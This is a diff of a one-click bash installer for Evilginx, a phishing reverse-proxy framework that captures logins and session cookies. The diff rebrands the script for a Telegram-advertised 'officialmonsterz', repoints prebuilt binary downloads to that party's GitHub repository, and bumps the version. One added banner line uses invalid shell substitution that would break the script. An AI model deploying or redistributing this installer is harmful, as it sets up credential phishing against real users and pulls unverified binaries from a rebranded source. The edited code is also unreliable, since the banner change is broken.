@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #############################################################################
-# Evilginx - Private Dev Edition - One-Click Installer
+# Evilginx - Private Dev Edition - One-Click Installer t.me/officialmonsterz
 #############################################################################
 # This script automates the complete installation and configuration process
 # Based on: DEPLOYMENT.md
@@ -94,8 +94,8 @@
 #   TUNNEL_DOMAIN=example.com sudo ./install.sh          # Pre-set tunnel domain
 #   TUNNEL_DOMAIN=example.com sudo ./install.sh --tunnel # Tunnel only, no prompt
 #
-# Author: AKaZA (Akz0fuku)
-# Version: 3.5.5
+# Author: github.com/officialmonsterz (t.me/officialmonsterz)
+# Version: 3.5.6
 #############################################################################
 
 set -euo pipefail  # Exit on error, undefined vars, pipe failures
@@ -162,14 +162,14 @@ if [[ -z "$SCRIPT_DIR" ]] || [[ ! -d "$SCRIPT_DIR" ]]; then
 fi
 
 # GitHub release download settings
-GITHUB_REPO="0fukuAkz/Evilginx3"
+GITHUB_REPO="officialmonsterz/Evilginx3"
 RELEASE_BASE_URL="https://github.com/${GITHUB_REPO}/releases/download"
 
 # Build method: "download" | "source" — set by --prebuilt/--source flags or choose_install_method()
 BUILD_METHOD=""
 
 # Configuration
-EVILGINX_VERSION="3.5.5"
+EVILGINX_VERSION="3.5.6"
 GO_VERSION="1.25.1"
 INSTALL_DIR="/usr/local/bin"
 INSTALL_BASE="/opt/evilginx"
@@ -269,15 +269,15 @@ print_banner() {
     cat << EOF
 ╔═══════════════════════════════════════════════════════════════════╗
 ║                                                                   ║
-║     ███████╗██╗   ██╗██╗██╗      ██████╗ ██╗███╗   ██╗██╗  ██╗  ║
-║     ██╔════╝██║   ██║██║██║     ██╔════╝ ██║████╗  ██║╚██╗██╔╝  ║
-║     █████╗  ██║   ██║██║██║     ██║  ███╗██║██╔██╗ ██║ ╚███╔╝   ║
-║     ██╔══╝  ╚██╗ ██╔╝██║██║     ██║   ██║██║██║╚██╗██║ ██╔██╗   ║
-║     ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗  ║
-║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝  ║
+║     ███████╗██╗   ██╗██╗██╗      ██████╗ ██╗███╗   ██╗██╗  ██╗    ║
+║     ██╔════╝██║   ██║██║██║     ██╔════╝ ██║████╗  ██║╚██╗██╔╝    ║
+║     █████╗  ██║   ██║██║██║     ██║  ███╗██║██╔██╗ ██║ ╚███╔╝     ║
+║     ██╔══╝  ╚██╗ ██╔╝██║██║     ██║   ██║██║██║╚██╗██║ ██╔██╗     ║
+║     ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗    ║
+║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ║
 ║                                                                   ║
-║              One-Click Installer - Private Dev Edition           ║
-║                         Version ${EVILGINX_VERSION}                             ║
+║         One-Click Installer - Monsterz Private Dev Edition        ║
+║        Version ${EVILGINX_VERSION FROM t.me/officialmonsterz}     ║
 ║                                                                   ║
 ╚═══════════════════════════════════════════════════════════════════╝
 EOF
@@ -1758,7 +1758,7 @@ display_completion() {
     echo ""
     echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════╗${NC}"
     echo -e "${GREEN}║                                                                   ║${NC}"
-    echo -e "${GREEN}║          ✓ INSTALLATION COMPLETED SUCCESSFULLY!                  ║${NC}"
+    echo -e "${GREEN}║  ✓ OFFICIALMONSTERZ INSTALLATION COMPLETED SUCCESSFULLY!          ║${NC}"
     echo -e "${GREEN}║                                                                   ║${NC}"
     echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
